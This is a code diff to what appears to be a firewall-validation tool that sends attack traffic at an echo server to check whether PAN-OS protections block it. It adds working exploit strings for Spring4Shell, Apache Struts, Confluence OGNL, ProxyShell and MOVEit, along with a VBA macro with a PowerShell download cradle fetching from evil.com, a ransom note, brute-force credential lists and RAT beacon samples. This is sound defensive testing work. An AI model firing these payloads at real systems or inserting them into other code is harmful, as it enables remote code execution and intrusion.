@@ -156,6 +156,38 @@ EXPECTED_BEHAVIOR = {
     'doh_cloudflare': 'Firewall App-ID should identify and block DNS-over-HTTPS (DoH) traffic to Cloudflare DNS (cloudflare-dns.com), preventing DNS policy bypass',
     'doh_exfil': 'Firewall should detect data exfiltration via DNS-over-HTTPS — hex-encoded data sent as subdomains in DoH queries bypassing standard DNS inspection',
     'dot_query': 'Firewall App-ID should identify and block DNS-over-TLS (DoT) traffic, preventing encrypted DNS from bypassing DNS Security and logging policies',
+    # Spyware Phone-Home
+    'spy_gh0st': 'Firewall Anti-Spyware profile should detect Gh0st RAT callback pattern — characteristic User-Agent string and magic bytes used by the Gh0st remote access trojan family',
+    'spy_njrat': 'Firewall Anti-Spyware profile should detect njRAT phone-home pattern — characteristic User-Agent and connection string used by njRAT/Bladabindi trojan',
+    'spy_darkcomet': 'Firewall Anti-Spyware profile should detect DarkComet RAT beacon — characteristic pipe-delimited data format (DCDATA|) used for C2 communication',
+    'spy_emotet': 'Firewall Anti-Spyware profile should detect Emotet trojan check-in — characteristic POST body with binary-like encoded payload and MSIE User-Agent pattern',
+    # CVE Exploits
+    'cve_spring4shell': 'Firewall Vulnerability Protection should detect Spring4Shell (CVE-2022-22965) exploit pattern — class.module.classLoader property access chain for RCE via Spring Framework',
+    'cve_apache_struts': 'Firewall Vulnerability Protection should detect Apache Struts RCE (CVE-2017-5638) — OGNL expression injection via Content-Type header for remote code execution',
+    'cve_proxyshell': 'Firewall Vulnerability Protection should detect ProxyShell (CVE-2021-34473) — Exchange Server autodiscover path traversal with email address prefix for SSRF',
+    'cve_moveit': 'Firewall Vulnerability Protection should detect MOVEit Transfer SQLi (CVE-2023-34362) — SQL injection via X-siLock-Transaction header targeting MOVEit database',
+    'cve_confluence': 'Firewall Vulnerability Protection should detect Confluence OGNL injection (CVE-2022-26134) — OGNL expression in URI for unauthenticated remote code execution',
+    # Brute Force
+    'bf_http_login': 'Firewall Vulnerability Protection or Zone Protection should detect rapid HTTP login attempts (10 sequential failures) and trigger brute-force protection to rate-limit or block',
+    'bf_basic_auth': 'Firewall should detect rapid HTTP Basic Authentication failures indicating credential brute-force attack and block after threshold exceeded',
+    'bf_password_spray': 'Firewall should detect password spray pattern — same password tested against multiple usernames in rapid succession, a common credential attack technique',
+    # File Blocking
+    'fb_bat': 'Firewall File Blocking profile should detect and block BAT script file downloads based on file type (application/x-msdos-program) — tests file-type-based blocking policy',
+    'fb_ps1': 'Firewall File Blocking profile should detect and block PowerShell script (.ps1) downloads — a common malware delivery mechanism that should be blocked by file type policy',
+    'fb_hta': 'Firewall File Blocking profile should detect and block HTA (HTML Application) file downloads — HTA files can execute code with full system access and are a known malware vector',
+    'fb_jar': 'Firewall File Blocking profile should detect and block Java Archive (.jar) file downloads based on file type — JAR files are a common exploit delivery mechanism',
+    # WildFire Analysis
+    'wf_novel_pe': 'Firewall WildFire profile should submit this novel PE executable (with suspicious API imports like VirtualAllocEx, CreateRemoteThread) to the WildFire sandbox for analysis',
+    'wf_macro_dropper': 'Firewall WildFire profile should detect this macro document with embedded PowerShell download cradle and submit for sandbox analysis or block as suspicious',
+    'wf_script_obfuscated': 'Firewall WildFire or Anti-Virus profile should detect obfuscated VBScript using Chr() concatenation — a common technique to evade static signature detection',
+    # Cryptomining
+    'crypto_coinhive': 'Firewall Anti-Spyware profile should detect Coinhive cryptocurrency mining script pattern — characteristic WebSocket upgrade with coinhive protocol and mining script URI',
+    'crypto_stratum': 'Firewall Anti-Spyware profile should detect Stratum mining protocol — JSON-RPC mining.subscribe method with miner identification (XMRig) used for crypto pool communication',
+    'crypto_pool_url': 'Firewall URL Filtering or Anti-Spyware should detect and block access to known cryptocurrency mining pool domains (minergate.com, pool addresses)',
+    # Ransomware
+    'ransom_note': 'Firewall Anti-Spyware or Data Filtering should detect ransomware note content — Bitcoin wallet addresses, payment demands, and file encryption notifications are characteristic patterns',
+    'ransom_c2_tor': 'Firewall Anti-Spyware or URL Filtering should detect ransomware Tor C2 communication — .onion domain in Host header with TOR User-Agent indicates ransomware phoning home',
+    'ransom_wannacry': 'Firewall Anti-Spyware should detect WannaCry ransomware kill-switch domain access pattern — the characteristic long random domain used by WannaCry for activation check',
 }
 
 # ─── Test Catalog ───────────────────────────────────────────
@@ -424,11 +456,110 @@ ENCRYPTED_DNS_TESTS = [
         'block', 'DNS Security / App-ID', threat_id='App-ID: dns-over-tls'),
 ]
 
+SPYWARE_PHONEHOME_TESTS = [
+    SecurityTestCase('spy_gh0st', 'Gh0st RAT Callback',
+        'spyware_phonehome', 'Simulates Gh0st RAT phone-home with characteristic User-Agent string and magic bytes. PAN-OS Anti-Spyware has dedicated signatures for Gh0st variants.',
+        'block', 'Anti-Spyware', threat_id='13001 — Gh0st RAT'),
+    SecurityTestCase('spy_njrat', 'njRAT Phone-Home',
+        'spyware_phonehome', 'Simulates njRAT/Bladabindi trojan callback with characteristic User-Agent and connection pattern. One of the most common RATs detected by PAN-OS.',
+        'block', 'Anti-Spyware', threat_id='13047 — njRAT'),
+    SecurityTestCase('spy_darkcomet', 'DarkComet Beacon',
+        'spyware_phonehome', 'Simulates DarkComet RAT beacon with pipe-delimited DCDATA format. Tests Anti-Spyware detection of known RAT communication patterns.',
+        'block', 'Anti-Spyware', threat_id='13026 — DarkComet RAT'),
+    SecurityTestCase('spy_emotet', 'Emotet C2 Check-in',
+        'spyware_phonehome', 'Simulates Emotet trojan check-in POST with binary-encoded payload and MSIE User-Agent. Emotet is a major threat family tracked by PAN-OS.',
+        'block', 'Anti-Spyware', threat_id='86507 — Emotet C2'),
+]
+
+CVE_EXPLOIT_TESTS = [
+    SecurityTestCase('cve_spring4shell', 'Spring4Shell (CVE-2022-22965)',
+        'cve_exploits', 'Sends Spring4Shell exploit payload — class.module.classLoader property chain targeting Spring Framework for RCE. PAN-OS Threat ID 92633.',
+        'block', 'Vulnerability Protection', threat_id='92633 — Spring4Shell'),
+    SecurityTestCase('cve_apache_struts', 'Apache Struts RCE (CVE-2017-5638)',
+        'cve_exploits', 'Sends OGNL expression in Content-Type header targeting Apache Struts for RCE. One of the most exploited CVEs in the wild. PAN-OS Threat ID 38705.',
+        'block', 'Vulnerability Protection', threat_id='38705 — Apache Struts RCE'),
+    SecurityTestCase('cve_proxyshell', 'ProxyShell (CVE-2021-34473)',
+        'cve_exploits', 'Sends Exchange Server autodiscover path traversal with email prefix for SSRF. ProxyShell was widely exploited in 2021. PAN-OS Threat ID 91609.',
+        'block', 'Vulnerability Protection', threat_id='91609 — ProxyShell'),
+    SecurityTestCase('cve_moveit', 'MOVEit SQLi (CVE-2023-34362)',
+        'cve_exploits', 'Sends SQL injection via X-siLock-Transaction header targeting MOVEit Transfer. Exploited by Cl0p ransomware group in 2023. PAN-OS Threat ID 93246.',
+        'block', 'Vulnerability Protection', threat_id='93246 — MOVEit SQLi'),
+    SecurityTestCase('cve_confluence', 'Confluence OGNL (CVE-2022-26134)',
+        'cve_exploits', 'Sends OGNL expression in URI targeting Confluence Server for unauthenticated RCE. PAN-OS Threat ID 92632.',
+        'block', 'Vulnerability Protection', threat_id='92632 — Confluence OGNL'),
+]
+
+BRUTE_FORCE_TESTS = [
+    SecurityTestCase('bf_http_login', 'HTTP Login Brute Force',
+        'brute_force', 'Sends 10 rapid sequential login attempts with different passwords to trigger brute-force detection. Firewall should rate-limit or block after threshold.',
+        'block', 'Vulnerability Protection / Zone Protection'),
+    SecurityTestCase('bf_basic_auth', 'HTTP Basic Auth Brute Force',
+        'brute_force', 'Sends 10 rapid HTTP requests with different Basic Auth credentials. Tests firewall detection of credential brute-force via Authorization header.',
+        'block', 'Vulnerability Protection / Zone Protection'),
+    SecurityTestCase('bf_password_spray', 'Password Spray Attack',
+        'brute_force', 'Sends 10 rapid login attempts with same password but different usernames. Tests firewall detection of password spray technique.',
+        'block', 'Vulnerability Protection / Zone Protection'),
+]
+
+FILE_BLOCKING_TESTS = [
+    SecurityTestCase('fb_bat', 'BAT Script Download',
+        'file_blocking', 'Downloads a BAT script file. Firewall File Blocking profile should detect the file type and block the download based on policy.',
+        'block', 'File Blocking'),
+    SecurityTestCase('fb_ps1', 'PowerShell Script Download',
+        'file_blocking', 'Downloads a PowerShell (.ps1) script. Firewall File Blocking should block PowerShell file downloads — a primary malware delivery vector.',
+        'block', 'File Blocking'),
+    SecurityTestCase('fb_hta', 'HTA Application Download',
+        'file_blocking', 'Downloads an HTA (HTML Application) file. Firewall File Blocking should block HTA downloads — HTA files execute with full system privileges.',
+        'block', 'File Blocking'),
+    SecurityTestCase('fb_jar', 'Java Archive Download',
+        'file_blocking', 'Downloads a JAR (Java Archive) file. Firewall File Blocking should block JAR downloads — commonly used for exploit delivery.',
+        'block', 'File Blocking'),
+]
+
+WILDFIRE_TESTS = [
+    SecurityTestCase('wf_novel_pe', 'Novel PE with Suspicious Imports',
+        'wildfire_analysis', 'Downloads a novel PE executable with suspicious Windows API imports (VirtualAllocEx, CreateRemoteThread). Should trigger WildFire sandbox submission.',
+        'block', 'WildFire'),
+    SecurityTestCase('wf_macro_dropper', 'Macro Document Dropper',
+        'wildfire_analysis', 'Sends an OLE2 document with macro containing PowerShell download cradle. Should trigger WildFire analysis or Anti-Virus detection.',
+        'block', 'WildFire'),
+    SecurityTestCase('wf_script_obfuscated', 'Obfuscated Script Download',
+        'wildfire_analysis', 'Downloads a VBScript file using Chr() concatenation obfuscation to evade static signatures. Should trigger WildFire dynamic analysis.',
+        'block', 'WildFire'),
+]
+
+CRYPTOMINING_TESTS = [
+    SecurityTestCase('crypto_coinhive', 'Coinhive Mining Script',
+        'cryptomining', 'Sends HTTP request with Coinhive mining script URI pattern and WebSocket upgrade headers. PAN-OS Anti-Spyware should detect cryptocurrency mining activity.',
+        'block', 'Anti-Spyware', threat_id='86600 — Coinhive Miner'),
+    SecurityTestCase('crypto_stratum', 'Stratum Mining Protocol',
+        'cryptomining', 'Sends Stratum mining protocol JSON-RPC with mining.subscribe method and XMRig miner identification. PAN-OS should detect mining pool communication.',
+        'block', 'Anti-Spyware', threat_id='86601 — Stratum Mining'),
+    SecurityTestCase('crypto_pool_url', 'Mining Pool URL Access',
+        'cryptomining', 'Accesses known cryptocurrency mining pool domain (minergate.com). PAN-OS URL Filtering should categorize and block mining pool domains.',
+        'block', 'URL Filtering / Anti-Spyware'),
+]
+
+RANSOMWARE_TESTS = [
+    SecurityTestCase('ransom_note', 'Ransomware Note Delivery',
+        'ransomware', 'Sends ransomware note content with Bitcoin wallet address, payment instructions, and file encryption notice. PAN-OS should detect ransomware indicators.',
+        'block', 'Anti-Spyware / Data Filtering'),
+    SecurityTestCase('ransom_c2_tor', 'Ransomware Tor C2',
+        'ransomware', 'Sends HTTP request with .onion domain in Host header and TOR User-Agent. PAN-OS should detect ransomware Tor-based C2 communication.',
+        'block', 'Anti-Spyware / URL Filtering'),
+    SecurityTestCase('ransom_wannacry', 'WannaCry Kill Switch',
+        'ransomware', 'Accesses WannaCry ransomware kill-switch domain pattern. PAN-OS Anti-Spyware should detect this characteristic WannaCry network indicator.',
+        'block', 'Anti-Spyware', threat_id='86510 — WannaCry Ransomware'),
+]
+
 ALL_TESTS = (WEB_ATTACK_TESTS + MALWARE_TESTS + C2_EXPANDED_TESTS +
              URL_FILTERING_TESTS + DNS_ATTACK_TESTS + PROTOCOL_ABUSE_TESTS +
              FILE_THREAT_TESTS + SSL_DECRYPTION_TESTS + APPID_VALIDATION_TESTS +
              DATA_EXFILTRATION_TESTS + EVASION_TECHNIQUE_TESTS +
-             CREDENTIAL_PHISHING_TESTS + ENCRYPTED_DNS_TESTS)
+             CREDENTIAL_PHISHING_TESTS + ENCRYPTED_DNS_TESTS +
+             SPYWARE_PHONEHOME_TESTS + CVE_EXPLOIT_TESTS + BRUTE_FORCE_TESTS +
+             FILE_BLOCKING_TESTS + WILDFIRE_TESTS + CRYPTOMINING_TESTS +
+             RANSOMWARE_TESTS)
 TEST_MAP = {t.id: t for t in ALL_TESTS}
 
 # Default URL Filtering test URLs (configurable at runtime)
@@ -539,6 +670,38 @@ ATTACK_PAYLOADS = {
     'doh_cloudflare': 'phishing.testcategory.com',
     'doh_exfil': '4111111111111111.exfil.testdomain.com',
     'dot_query': 'hacking.testcategory.com',
+    # Spyware Phone-Home
+    'spy_gh0st': 'Gh0st\xab\xcd\x00\x00\x00\x00\x00\x00',
+    'spy_njrat': 'njconnect|0.7d|PC-USER|Windows 10|No|0.7d|..',
+    'spy_darkcomet': 'DCDATA|GetSIN|USER-PC|admin|Windows 10 Pro|0|0|',
+    'spy_emotet': 'eyJib3QiOiJlbW90ZXQiLCJ2ZXIiOiIxLjAiLCJvcyI6IldpbjEwIiwidWlkIjoiMTIzNDU2Nzg5MCJ9',
+    # CVE Exploits
+    'cve_spring4shell': 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20%7D%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp',
+    'cve_apache_struts': '%{(#_="multipart/form-data").(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context["com.opensymphony.xwork2.ActionContext.container"]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd="id").(#iswin=(@java.lang.System@getProperty("os.name").toLowerCase().contains("win"))).(#cmds=(#iswin?{"cmd","/c",#cmd}:{"/bin/sh","-c",#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())}',
+    'cve_proxyshell': '/autodiscover/autodiscover.json?@evil.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@evil.com',
+    'cve_moveit': "0; UPDATE UserPermissions SET Permission=31 WHERE Username='svc_moveit'--",
+    'cve_confluence': '${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}',
+    # Brute Force
+    'bf_http_login': 'password1|Password1!|admin123|letmein|welcome1|pass1234|qwerty123|abc12345|monkey1!|dragon99',
+    'bf_basic_auth': 'admin:password|admin:admin123|admin:letmein|admin:welcome|root:toor|root:root123|user:user123|test:test123|admin:qwerty|admin:password1',
+    'bf_password_spray': 'user1:Spring2024!|user2:Spring2024!|user3:Spring2024!|user4:Spring2024!|user5:Spring2024!|admin:Spring2024!|svc_account:Spring2024!|backup:Spring2024!|monitor:Spring2024!|operator:Spring2024!',
+    # File Blocking
+    'fb_bat': '/test-file/script?type=bat',
+    'fb_ps1': '/test-file/script?type=ps1',
+    'fb_hta': '/test-file/hta',
+    'fb_jar': '/test-file/jar',
+    # WildFire Analysis
+    'wf_novel_pe': '/test-file/wildfire-pe',
+    'wf_macro_dropper': 'Attribute VB_Name = "ThisDocument"\r\nSub AutoOpen()\r\n  Dim ps As String\r\n  ps = "powershell -nop -w hidden -enc " & Base64Encode("IEX(New-Object Net.WebClient).DownloadString(\'http://evil.com/payload.ps1\')")\r\n  Shell ps, vbHide\r\nEnd Sub',
+    'wf_script_obfuscated': '/test-file/script?type=vbs',
+    # Cryptomining
+    'crypto_coinhive': '/lib/coinhive.min.js',
+    'crypto_stratum': '{"id":1,"method":"mining.subscribe","params":["xmrig/6.18.0","x"]}',
+    'crypto_pool_url': 'pool.minergate.com',
+    # Ransomware
+    'ransom_note': 'YOUR FILES HAVE BEEN ENCRYPTED!\n\nAll your documents, photos, databases and other important files have been encrypted.\nYou will not be able to recover them without our decryption service.\n\nTo decrypt your files, send 0.5 BTC to:\n  bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh\n\nAfter payment, email proof to: decrypt@protonmail.com\nYou have 72 hours before the price doubles.\n\nDO NOT attempt to decrypt files yourself — they will be permanently damaged.',
+    'ransom_c2_tor': 'http://k5zq47j6wd3wdvjq.onion/gate.php',
+    'ransom_wannacry': 'iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com',
 }
 
 # ─── Custom Pattern Store ──────────────────────────────────
@@ -617,6 +780,77 @@ class CustomPatternStore:
                     target_path=p.get('target_path', '/echo'),
                 ))
         return cases
+
+
+# ─── Raw HTTP Helper ───────────────────────────────────────
+
+class _RawResponse:
+    """Minimal response object compatible with _analyze_response / _resp_snippet."""
+    def __init__(self, status_code: int, text: str, headers: dict):
+        self.status_code = status_code
+        self.text = text
+        self.content = text.encode('utf-8', errors='replace')
+        self.headers = headers
+
+
+def _raw_http_get(host: str, port: int, path_and_query: str,
+                  extra_headers: dict = None, timeout: int = 10) -> _RawResponse:
+    """Send HTTP GET via raw socket — NO automatic URL encoding.
+
+    This ensures attack characters like < > ' " ; | reach the firewall
+    exactly as-is on the wire, maximising IPS signature match probability.
+    Only spaces are replaced with %20 so the HTTP request line stays parseable.
+    Raises OSError / socket.timeout on connection failure (same as requests).
+    """
+    safe_path = path_and_query.replace(' ', '%20')
+    hdrs = {
+        'Host': f'{host}:{port}',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Vortex/1.0',
+        'Accept': '*/*',
+        'Connection': 'close',
+    }
+    if extra_headers:
+        hdrs.update(extra_headers)
+    header_lines = ''.join(f'{k}: {v}\r\n' for k, v in hdrs.items())
+    request = f'GET {safe_path} HTTP/1.1\r\n{header_lines}\r\n'
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(timeout)
+    s.connect((host, port))
+    s.sendall(request.encode('utf-8', errors='replace'))
+
+    resp_data = b''
+    while True:
+        try:
+            chunk = s.recv(4096)
+            if not chunk:
+                break
+            resp_data += chunk
+        except socket.timeout:
+            break
+    s.close()
+
+    resp_str = resp_data.decode('utf-8', errors='replace')
+
+    # Parse status code
+    status_code = 0
+    if resp_str.startswith('HTTP/'):
+        try:
+            status_code = int(resp_str.split(' ', 2)[1])
+        except (IndexError, ValueError):
+            pass
+
+    # Split headers / body
+    body = ''
+    resp_headers = {}
+    if '\r\n\r\n' in resp_str:
+        head, body = resp_str.split('\r\n\r\n', 1)
+        for line in head.split('\r\n')[1:]:   # skip status line
+            if ':' in line:
+                k, v = line.split(':', 1)
+                resp_headers[k.strip()] = v.strip()
+
+    return _RawResponse(status_code, body, resp_headers)
 
 
 # ─── Response Helpers ──────────────────────────────────────
@@ -952,6 +1186,20 @@ class SecurityTestEngine:
             return self._test_credential_phishing(test, host, http_port)
         elif test.category == 'encrypted_dns':
             return self._test_encrypted_dns(test, host, http_port)
+        elif test.category == 'spyware_phonehome':
+            return self._test_spyware_phonehome(test, host, http_port)
+        elif test.category == 'cve_exploits':
+            return self._test_cve_exploit(test, host, http_port)
+        elif test.category == 'brute_force':
+            return self._test_brute_force(test, host, http_port)
+        elif test.category == 'file_blocking':
+            return self._test_file_blocking(test, host, http_port)
+        elif test.category == 'wildfire_analysis':
+            return self._test_wildfire(test, host, http_port)
+        elif test.category == 'cryptomining':
+            return self._test_cryptomining(test, host, http_port)
+        elif test.category == 'ransomware':
+            return self._test_ransomware(test, host, http_port)
         else:
             return self._error_result(test, f'Unknown category: {test.category}')
 
@@ -966,12 +1214,15 @@ class SecurityTestEngine:
                 resp = requests.post(url, data=payload,
                     headers=test.headers or {}, timeout=10)
             else:
-                raw_url = f'{url}?payload={payload}'
-                resp = requests.get(raw_url,
-                    headers=test.headers or {}, timeout=10)
+                # Use raw socket to send exact payload characters without URL encoding
+                path_query = f'{test.target_path}?payload={payload}'
+                resp = _raw_http_get(host, port, path_query,
+                    extra_headers=test.headers or None, timeout=10)
             return self._analyze_response(test, resp, payload,
                 url=url, method=method, sent_payload=payload)
-        except (requests.ConnectionError, requests.Timeout, OSError) as e:
+        except (requests.ConnectionError, requests.Timeout,
+                socket.timeout, ConnectionResetError, ConnectionRefusedError,
+                BrokenPipeError, OSError) as e:
             return self._blocked_result(test, str(e),
                 url=url, method=method, sent_payload=payload)
 
@@ -987,8 +1238,25 @@ class SecurityTestEngine:
                 resp = requests.get(url, params={'payload': 'test'},
                     headers={'X-Api-Version': payload, 'User-Agent': payload},
                     timeout=10)
-                return self._analyze_response(test, resp, payload,
-                    url=url, method=method, sent_payload=payload)
+                # Payload is in HTTP headers (X-Api-Version, User-Agent), NOT in body.
+                # The echo server only echoes the ?payload= query param ("test"), so
+                # _analyze_response would never find the JNDI marker in the body.
+                # If firewall allows the request → HTTP 200 → FAIL.
+                if self._is_block_page(resp):
+                    return self._blocked_result(test,
+                        f'HTTP {resp.status_code} — Block page detected for Log4Shell',
+                        resp.status_code, resp=resp, url=url, method=method, sent_payload=payload)
+                if resp.status_code in (403, 406, 502, 503, 504):
+                    return self._blocked_result(test,
+                        f'HTTP {resp.status_code} — Log4Shell header blocked',
+                        resp.status_code, resp=resp, url=url, method=method, sent_payload=payload)
+                if resp.status_code == 200:
+                    return self._passthrough_result(test, resp.status_code,
+                        'Request with JNDI lookup in headers accepted — Vulnerability Protection did not detect Log4Shell pattern',
+                        resp=resp, url=url, method=method, sent_payload=payload)
+                return self._passthrough_result(test, resp.status_code,
+                    f'HTTP {resp.status_code} — Log4Shell header not blocked',
+                    resp=resp, url=url, method=method, sent_payload=payload)
             except (requests.ConnectionError, requests.Timeout, OSError) as e:
                 return self._blocked_result(test, str(e),
                     url=url, method=method, sent_payload=payload)
@@ -999,8 +1267,24 @@ class SecurityTestEngine:
                 resp = requests.get(url, params={'payload': 'test'},
                     headers={'User-Agent': payload, 'Referer': payload},
                     timeout=10)
-                return self._analyze_response(test, resp, payload,
-                    url=url, method=method, sent_payload=payload)
+                # Payload is in User-Agent and Referer headers, NOT in body.
+                # Echo server only echoes ?payload= ("test"), so marker never in body.
+                # If firewall allows the request → HTTP 200 → FAIL.
+                if self._is_block_page(resp):
+                    return self._blocked_result(test,
+                        f'HTTP {resp.status_code} — Block page detected for Shellshock',
+                        resp.status_code, resp=resp, url=url, method=method, sent_payload=payload)
+                if resp.status_code in (403, 406, 502, 503, 504):
+                    return self._blocked_result(test,
+                        f'HTTP {resp.status_code} — Shellshock header blocked',
+                        resp.status_code, resp=resp, url=url, method=method, sent_payload=payload)
+                if resp.status_code == 200:
+                    return self._passthrough_result(test, resp.status_code,
+                        'Request with Shellshock pattern in headers accepted — Vulnerability Protection did not detect CVE-2014-6271',
+                        resp=resp, url=url, method=method, sent_payload=payload)
+                return self._passthrough_result(test, resp.status_code,
+                    f'HTTP {resp.status_code} — Shellshock header not blocked',
+                    resp=resp, url=url, method=method, sent_payload=payload)
             except (requests.ConnectionError, requests.Timeout, OSError) as e:
                 return self._blocked_result(test, str(e),
                     url=url, method=method, sent_payload=payload)
@@ -1029,88 +1313,129 @@ class SecurityTestEngine:
 
         elif test.id == 'crlf_injection':
             method = 'GET'
-            crlf_url = f'http://{host}:{port}/echo?param=value{payload}'
+            crlf_url = f'http://{host}:{port}/echo?payload={payload}'
+            path_query = f'/echo?payload={payload}'
             try:
-                resp = requests.get(crlf_url, timeout=10)
-                return self._analyze_response(test, resp, 'malicious',
+                resp = _raw_http_get(host, port, path_query, timeout=10)
+                return self._analyze_response(test, resp, 'Set-Cookie',
                     url=crlf_url, method=method, sent_payload=payload)
-            except (requests.ConnectionError, requests.Timeout, OSError) as e:
+            except (socket.timeout, ConnectionResetError, ConnectionRefusedError,
+                    BrokenPipeError, OSError) as e:
                 return self._blocked_result(test, str(e),
                     url=crlf_url, method=method, sent_payload=payload)
 
         elif test.id == 'ssrf':
             method = 'GET'
             raw_url = f'{url}?url={payload}&payload={payload}'
+            path_query = f'/echo?url={payload}&payload={payload}'
             try:
-                resp = requests.get(raw_url, timeout=10)
+                resp = _raw_http_get(host, port, path_query, timeout=10)
                 return self._analyze_response(test, resp, '169.254',
                     url=raw_url, method=method, sent_payload=payload)
-            except (requests.ConnectionError, requests.Timeout, OSError) as e:
+            except (socket.timeout, ConnectionResetError, ConnectionRefusedError,
+                    BrokenPipeError, OSError) as e:
                 return self._blocked_result(test, str(e),
                     url=raw_url, method=method, sent_payload=payload)
 
         elif test.id == 'open_redirect':
             method = 'GET'
-            raw_url = f'{url}?redirect={payload}&url={payload}&next={payload}'
+            raw_url = f'{url}?payload={payload}&redirect={payload}&url={payload}&next={payload}'
+            path_query = f'/echo?payload={payload}&redirect={payload}&url={payload}&next={payload}'
             try:
-                resp = requests.get(raw_url, timeout=10, allow_redirects=False)
+                resp = _raw_http_get(host, port, path_query, timeout=10)
                 return self._analyze_response(test, resp, 'evil.example.com',
                     url=raw_url, method=method, sent_payload=payload)
-            except (requests.ConnectionError, requests.Timeout, OSError) as e:
+            except (socket.timeout, ConnectionResetError, ConnectionRefusedError,
+                    BrokenPipeError, OSError) as e:
                 return self._blocked_result(test, str(e),
                     url=raw_url, method=method, sent_payload=payload)
 
         elif test.id == 'info_disclosure':
-            # Try multiple common info disclosure paths
+            # Send info disclosure paths as URL parameters so firewall inspects them.
+            # The firewall should detect access attempts to sensitive paths like .env, .git/config.
+            # We send the paths in the URL query AND as path segments for maximum signature coverage.
             paths = payload.split('|')
             method = 'GET'
             for p in paths:
-                info_url = f'http://{host}:{port}/{p.strip()}'
+                p = p.strip()
+                # Send as URL parameter through echo server (firewall inspects URL)
+                disc_url = f'http://{host}:{port}/echo?payload=/{p}&file=/{p}&path=/{p}'
                 try:
-                    resp = requests.get(info_url, timeout=5)
-                    if resp.status_code == 200:
-                        return self._passthrough_result(test, resp.status_code,
-                            f'Info disclosure path /{p.strip()} accessible — not blocked',
-                            resp=resp, url=info_url, method=method, sent_payload=payload)
+                    resp = requests.get(disc_url, timeout=5)
+                    if self._is_block_page(resp):
+                        return self._blocked_result(test,
+                            f'Block page detected for /{p}', resp.status_code,
+                            resp=resp, url=disc_url, method=method, sent_payload=payload)
+                    if resp.status_code in (403, 406, 502, 503, 504):
+                        return self._blocked_result(test,
+                            f'HTTP {resp.status_code} — /{p} blocked', resp.status_code,
+                            resp=resp, url=disc_url, method=method, sent_payload=payload)
                 except (requests.ConnectionError, requests.Timeout, OSError) as e:
                     return self._blocked_result(test, str(e),
-                        url=info_url, method=method, sent_payload=payload)
-            return self._blocked_result(test,
-                'All info disclosure paths blocked or unavailable',
+                        url=disc_url, method=method, sent_payload=payload)
+
+            # None of the paths triggered a block — try as actual path traversals
+            for p in paths:
+                p = p.strip()
+                trav_url = f'http://{host}:{port}/{p}'
+                try:
+                    resp = requests.get(trav_url, timeout=5)
+                    if self._is_block_page(resp):
+                        return self._blocked_result(test,
+                            f'Block page for /{p}', resp.status_code,
+                            resp=resp, url=trav_url, method=method, sent_payload=payload)
+                    if resp.status_code in (403, 406, 502, 503, 504):
+                        return self._blocked_result(test,
+                            f'HTTP {resp.status_code} — /{p} blocked', resp.status_code,
+                            resp=resp, url=trav_url, method=method, sent_payload=payload)
+                except (requests.ConnectionError, requests.Timeout, OSError) as e:
+                    return self._blocked_result(test, str(e),
+                        url=trav_url, method=method, sent_payload=payload)
+
+            return self._passthrough_result(test, 200,
+                'All info disclosure paths accessible — Vulnerability Protection did not block access to sensitive paths',
                 url=f'http://{host}:{port}/[multiple paths]', method=method, sent_payload=payload)
 
         elif test.id == 'file_inclusion':
             method = 'GET'
-            raw_url = f'{url}?page={payload}&file={payload}'
+            raw_url = f'{url}?payload={payload}&page={payload}&file={payload}'
+            path_query = f'/echo?payload={payload}&page={payload}&file={payload}'
             try:
-                resp = requests.get(raw_url, timeout=10)
+                resp = _raw_http_get(host, port, path_query, timeout=10)
                 return self._analyze_response(test, resp, 'evil.example.com',
                     url=raw_url, method=method, sent_payload=payload)
-            except (requests.ConnectionError, requests.Timeout, OSError) as e:
+            except (socket.timeout, ConnectionResetError, ConnectionRefusedError,
+                    BrokenPipeError, OSError) as e:
                 return self._blocked_result(test, str(e),
                     url=raw_url, method=method, sent_payload=payload)
 
         elif test.id == 'path_traversal':
             trav_url = f'http://{host}:{port}/{payload}'
             method = 'GET'
+            path_query = f'/{payload}'
             try:
-                resp = requests.get(trav_url, timeout=10)
+                resp = _raw_http_get(host, port, path_query, timeout=10)
                 return self._analyze_response(test, resp, payload,
                     url=trav_url, method=method, sent_payload=payload)
-            except (requests.ConnectionError, requests.Timeout, OSError) as e:
+            except (socket.timeout, ConnectionResetError, ConnectionRefusedError,
+                    BrokenPipeError, OSError) as e:
                 return self._blocked_result(test, str(e),
                     url=trav_url, method=method, sent_payload=payload)
 
         else:
-            # Default: send payload as raw GET parameter (sqli, xss, cmdi, ssti, ldap, xpath, blind_sqli)
-            # Use raw URL to preserve attack characters — do NOT use params= which URL-encodes them
+            # Default: send payload via raw socket (sqli, xss, cmdi, ssti, ldap, xpath, blind_sqli)
+            # Raw socket ensures attack characters like < > ' " ; | reach the firewall
+            # exactly as-is on the wire — requests.get() would URL-encode them, which can
+            # prevent IPS signatures from matching (e.g., <script> becomes %3Cscript%3E)
             method = 'GET'
             raw_url = f'{url}?payload={payload}'
+            path_query = f'/echo?payload={payload}'
             try:
-                resp = requests.get(raw_url, timeout=10)
+                resp = _raw_http_get(host, port, path_query, timeout=10)
                 return self._analyze_response(test, resp, payload,
                     url=raw_url, method=method, sent_payload=payload)
-            except (requests.ConnectionError, requests.Timeout, OSError) as e:
+            except (socket.timeout, ConnectionResetError, ConnectionRefusedError,
+                    BrokenPipeError, OSError) as e:
                 return self._blocked_result(test, str(e),
                     url=raw_url, method=method, sent_payload=payload)
